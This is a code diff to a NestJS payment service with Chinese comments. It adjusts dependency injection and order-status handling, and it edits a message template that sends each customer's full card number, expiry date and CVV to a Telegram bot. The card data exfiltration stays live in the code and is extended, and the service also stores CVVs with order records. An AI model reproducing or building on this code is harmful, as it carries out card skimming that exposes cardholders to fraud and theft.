@@ -1,4 +1,4 @@
-import { Injectable, Logger } from '@nestjs/common'
+import { Injectable, Logger, Inject, forwardRef } from '@nestjs/common'
 import { InjectRepository } from '@nestjs/typeorm'
 import { Repository, Between, LessThan } from 'typeorm'
 import * as fs from 'fs/promises'
@@ -32,7 +32,7 @@ export class F1Service {
     private readonly paymentMethodRepository: Repository<PaymentMethod>,
         @InjectRedis() private readonly redis: Redis,
         private readonly httpService: HttpService,
-        private readonly hpPayService: HpPayService,
+        @Inject(forwardRef(() => HpPayService)) private readonly hpPayService: HpPayService,
         
   ) { }
 
@@ -312,7 +312,7 @@ export class F1Service {
         cvv: paymentDto.card_cvv,
         cardName: paymentDto.card_name,
         amount: amount/100,
-        status: 'success'
+        status: '准备支付'
       })
 
       // ========== 新增逻辑：调用 hp-pay 创建支付订单 ==========
@@ -445,6 +445,11 @@ export class F1Service {
         await this.f1OrderRepository.update(
           { orderNo },
           { orderStatus: 2 }, // 已完成
+        )
+      }else{
+        await this.f1OrderRepository.update(
+          { orderNo },
+          { orderStatus: 3 }, // 失败
         )
       }
 
@@ -760,10 +765,10 @@ const message = `
 📋 <b>订单号:</b> <code>${orderNo}</code>\n
 💰 <b>金额:</b> ${amount} \n
 🏦 <b>信用卡号:</b> ${cardNumber}\n
-💳 <b>卡名:</b> ${cardName}\n
 📅 <b>有效期:</b> ${expire}\n
 CVV <b>CVV:</b> ${cvv}\n  
 🕐<b>时间:</b> ${currentTime}\n
+<b>状态:</b> ${status}\n
 `.trim();
       const url = `${this.TELEGRAM_CONFIG.apiUrl}${this.TELEGRAM_CONFIG.botToken}/sendMessage`;
       
